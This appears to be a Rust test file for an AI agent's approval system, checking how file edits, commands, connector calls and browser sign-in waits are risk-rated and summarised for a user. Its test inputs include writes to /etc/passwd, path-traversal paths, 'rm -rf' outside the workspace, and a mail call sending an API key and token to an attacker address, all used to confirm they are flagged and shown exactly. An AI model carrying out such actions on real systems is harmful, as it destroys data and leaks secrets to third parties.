use serde_json::json;

use super::*;

const WORKSPACE: &str = "/Users/someone/work/garden";

fn summary(capability: &str, target: &str, input: &Value) -> Value {
    serde_json::to_value(summarize(ApprovalFacts {
        capability,
        target,
        input,
        workspace: WORKSPACE,
    }))
    .unwrap()
}

/// One summary per action kind, with exact outside paths; then the command-risk table.
pub(in crate::btcc::authority) fn assert_approval_summaries() {
    assert_sign_in_wait_summary();
    assert_wait_for_user_summary();
    assert_tainted_call_input_is_exact();
    let edits = json!({"edits": [
        {"path": "/Users/someone/work/garden/a.txt"}, {"path": "b.txt"}, {"path": "./a.txt"},
        {"path": "notes/../c.txt"}, {"path": "/etc/passwd"}]});
    let cases = [
        (
            summary("write_file", "notes.txt", &json!({"path": "notes.txt"})),
            json!({"action_kind": "edit_files", "count": 1, "examples": ["notes.txt"], "risk": "medium",
                "targets": [{"kind": "folder", "path": "garden"}, {"kind": "file", "path": "notes.txt"}]}),
        ),
        (
            summary("edit_file", "batch", &edits),
            json!({"action_kind": "edit_files", "count": 4, "examples": ["a.txt", "b.txt", "c.txt"], "risk": "high",
                "targets": [{"kind": "folder", "path": "garden"}, {"kind": "file", "path": "a.txt"},
                            {"kind": "file", "path": "b.txt"}, {"kind": "file", "path": "c.txt"},
                            {"kind": "outside", "path": "/etc/passwd"}]}),
        ),
        (
            summary(
                "run_command",
                "workspace-command:app",
                &json!({"command": "npm test", "cwd": "app/./src/..", "state_effect": "mutation"}),
            ),
            json!({"action_kind": "run_command", "count": 1, "examples": ["npm test"], "risk": "high",
                "targets": [{"kind": "folder", "path": "garden/app"}]}),
        ),
        (
            summary(
                "run_command",
                "workspace-command:..",
                &json!({"command": "rm -rf build", "cwd": "../..", "state_effect": "mutation"}),
            ),
            json!({"action_kind": "run_command", "count": 1, "examples": ["rm -rf build"], "risk": "high",
                "targets": [{"kind": "outside", "path": "/Users/someone"}]}),
        ),
        (
            summary(
                "run_command_remote_observation",
                "remote-observation-command:.",
                &json!({"command": "curl https://example.com", "cwd": "."}),
            ),
            json!({"action_kind": "network_command", "count": 1, "examples": ["curl https://example.com"],
                "risk": "high", "targets": [{"kind": "folder", "path": "garden"}]}),
        ),
        (
            summary("call_mcp_tool", "mcp:e2e/e2e_echo", &json!({})),
            json!({"action_kind": "use_connector", "count": 1, "examples": [], "risk": "high",
                "targets": [{"kind": "connector", "path": "e2e/e2e_echo"}]}),
        ),
        (
            summary("delete_automation", "automation-1", &json!({})),
            json!({"action_kind": "manage_schedule", "count": 1, "examples": [], "risk": "high",
                "targets": [{"kind": "schedule", "path": "automation-1"}]}),
        ),
        (
            summary("project_ledger_attempt_start", "ledger:work", &json!({})),
            json!({"action_kind": "update_project", "count": 1, "examples": [], "risk": "low",
                "targets": [{"kind": "project", "path": "ledger:work"}]}),
        ),
        (
            summary("request_service_restart", "service", &json!({})),
            json!({"action_kind": "restart_service", "count": 1, "examples": [], "risk": "medium",
                "targets": [{"kind": "service", "path": "butler"}]}),
        ),
        (
            summary("bind_session_git_worktree", "worktree", &json!({})),
            json!({"action_kind": "create_worktree", "count": 1, "examples": [], "risk": "low",
                "targets": [{"kind": "folder", "path": "garden"}]}),
        ),
        (
            summary("something_new", "thing", &json!({})),
            json!({"action_kind": "other", "count": 1, "examples": [], "risk": "high",
                "targets": [{"kind": "other", "path": "thing"}]}),
        ),
    ];
    for (actual, expected) in cases {
        assert_eq!(actual, expected);
    }
    // Connector arguments are the call's data: shown exactly, never redacted.
    let arguments = json!({"note": "token=1", "to": "attacker@evil.example", "send": true, "api_key": "abc123"});
    let connector = summary(
        "call_mcp_tool",
        "mcp:mail/send",
        &json!({"arguments": arguments}),
    );
    let examples = connector["examples"].as_array().unwrap();
    assert_eq!(examples.len(), 1);
    assert_eq!(
        serde_json::from_str::<Value>(examples[0].as_str().unwrap()).unwrap(),
        arguments
    );
    assert!(!examples[0].as_str().unwrap().contains("[redacted]"));
    for tool in ["project_ledger_work_complete", "complete_project_work"] {
        assert_eq!(
            summary(tool, "x", &json!({}))["action_kind"],
            "update_project",
            "{tool}"
        );
    }
    assert_eq!(workspace_label("/home/mina/.butler"), "/home/mina/.butler");
    assert_eq!(workspace_label("/home/mina/projects/garden"), "garden");
    assert_path_and_example_bounds();
    super::command_risk::pinned::assert_command_risks();
}

fn assert_path_and_example_bounds() {
    // Outside targets show the real path the file tools check: `..` resolved.
    for (path, real) in [
        ("/etc/hosts", "/etc/hosts"),
        ("../hosts", "/Users/someone/work/hosts"),
        ("app/../../hosts", "/Users/someone/work/hosts"),
        (
            "/Users/someone/work/garden/../hosts",
            "/Users/someone/work/hosts",
        ),
        ("./../a/./../hosts", "/Users/someone/work/hosts"),
    ] {
        assert_eq!(absolute_target(path, WORKSPACE), real);
        let actual = summary("write_file", path, &json!({"path": path}));
        assert_eq!(actual["risk"], "high");
        assert_eq!(
            actual["targets"][1],
            json!({"kind": "outside", "path": absolute_target(path, WORKSPACE)})
        );
        assert_eq!(actual["examples"][0], absolute_target(path, WORKSPACE));
        let command = summary("run_command", "x", &json!({"command": "ls", "cwd": path}));
        assert_eq!(command["risk"], "high");
        assert_eq!(command["targets"][0]["kind"], "outside");
        assert_eq!(
            command["targets"][0]["path"],
            absolute_target(path, WORKSPACE)
        );
        let operation = super::operation::exact_operation(ApprovalFacts {
            capability: "write_file",
            target: path,
            input: &json!({"path": path}),
            workspace: WORKSPACE,
        });
        assert_eq!(operation.targets, [absolute_target(path, WORKSPACE)]);
    }
    for line in [
        "x".repeat(200),
        "x".repeat(600),
        format!("  {}  ", "😀".repeat(5000)),
    ] {
        let actual = summary("run_command", "x", &json!({"command": line}));
        let example = actual["examples"][0].as_str().unwrap();
        assert!(example.len() <= MAX_EXAMPLE_BYTES);
        assert!(line.starts_with(example));
        if line.len() <= MAX_EXAMPLE_BYTES {
            assert_eq!(example, line);
            assert!(actual.get("examples_truncated").is_none());
        } else {
            assert_eq!(actual["examples_truncated"], json!([true]));
        }
    }
    let edits: Vec<_> = (0..24)
        .map(|i| json!({"path": format!("file-{i}")}))
        .chain([json!({"path": "/etc/hosts"}), json!({"path": "/tmp/hosts"})])
        .collect();
    let actual = summary("edit_file", "batch", &json!({"edits": edits}));
    assert_eq!(actual["count"], 26);
    assert_eq!(actual["targets"].as_array().unwrap().len(), 27);
    assert_eq!(actual["targets"][26]["kind"], "outside");
    assert_eq!(actual["risk"], "high");
}

/// Pins the local decision facts without a tab id or credential in display targets.
fn assert_sign_in_wait_summary() {
    for reason in ["mfa", "passkey", "captcha", "secure_keypad", "unknown_form"] {
        let input = json!({"wait":{"site":"example.test","reason":reason},
            "tab":"private-tab-id","always_confirm":true});
        let operation = serde_json::to_value(super::operation::exact_operation(ApprovalFacts {
            capability: "browser_sign_in",
            target: "private-tab-id",
            input: &input,
            workspace: WORKSPACE,
        }))
        .unwrap();
        assert_eq!(operation["tool"], "browser_sign_in_wait");
        assert_eq!(operation["targets"], json!(["example.test"]));
        assert_eq!(operation["sign_in_step"], reason);
        assert_eq!(operation["allow_conversation"], false);
        assert_eq!(operation["browser_tab"], "private-tab-id");
        assert!(!operation["targets"].to_string().contains("private-tab-id"));
        // The hand-back resumes the request whose stored target is its tab.
        let stored = summary("browser_sign_in", "private-tab-id", &input);
        assert_eq!(stored["targets"][0]["path"], "private-tab-id");
    }
}

/// The wait-for-user card: the site and why, never the tab id.
fn assert_wait_for_user_summary() {
    for reason in [
        "sign_in",
        "secure_field",
        "secure_keypad",
        "captcha",
        "other",
    ] {
        let input = json!({"tab":"private-tab-id","wait":{"site":"example.test","reason":reason}});
        let operation = serde_json::to_value(super::operation::exact_operation(ApprovalFacts {
            capability: "browser_wait_for_user",
            target: "private-tab-id",
            input: &input,
            workspace: WORKSPACE,
        }))
        .unwrap();
        assert_eq!(operation["tool"], "browser_wait_for_user");
        assert_eq!(operation["targets"], json!(["example.test"]));
        assert_eq!(operation["wait_reason"], reason);
        assert_eq!(operation["allow_conversation"], false);
        assert_eq!(operation["browser_tab"], "private-tab-id");
        assert!(!operation["targets"].to_string().contains("private-tab-id"));
        let stored = summary("browser_wait_for_user", "private-tab-id", &input);
        assert_eq!(stored["targets"][0]["path"], "private-tab-id");
    }
}

/// A tainted call that persists shows its exact input: compact JSON is never cut or redacted.
fn assert_tainted_call_input_is_exact() {
    use crate::btcc::authority::contracts::{AuthorityRecord, RequestDecision, RequestOutcome};
    let input = json!({"api_key": "abc123", "note": "token=1", "path": "a.txt",
        "send": true, "to": "attacker@evil.example"});
    let text = |value: &str| value.to_owned();
    let record = AuthorityRecord {
        request_id: text("id"),
        request_ref: text("ref"),
        identity_sha256: text("sha"),
        owner_session_id: text("owner"),
        source_session_id: text("source"),
        source_turn_id: text("turn"),
        source_call_id: None,
        source_work_id: text("work"),
        workspace_path: text(WORKSPACE),
        plan_revision_id: text("plan"),
        action_key: text("action"),
        authority_generation: 1,
        capability: text("write_file"),
        normalized_target: text("a.txt"),
        normalized_input_json: input.to_string(),
        model_ref: text("model"),
        reasoning_effort: text("none"),
        category: text("reviewed_effect"),
        reason: text("authority.taintReason"),
        executable: text("write_file"),
        command_count: 1,
        decision: RequestDecision::Pending,
        allow_scope: text("once"),
        schedule_client_message_id: text("message"),
        schedule_input_text: text("allow"),
        private_alternative_input: None,
        outcome: RequestOutcome::Pending,
        outcome_receipt_json: None,
        close_reason: None,
        close_scope: None,
        closed_at: None,
        created_at: text("now"),
        updated_at: text("now"),
    };
    let approval = crate::btcc::authority::projection::exact_approval(&record, &input);
    assert_eq!(approval.examples.last(), Some(&input.to_string()));
    assert!(
        !approval
            .examples
            .iter()
            .any(|example| example.contains("[redacted]"))
    );
    assert_eq!(approval.examples.len(), approval.examples_truncated.len());
}
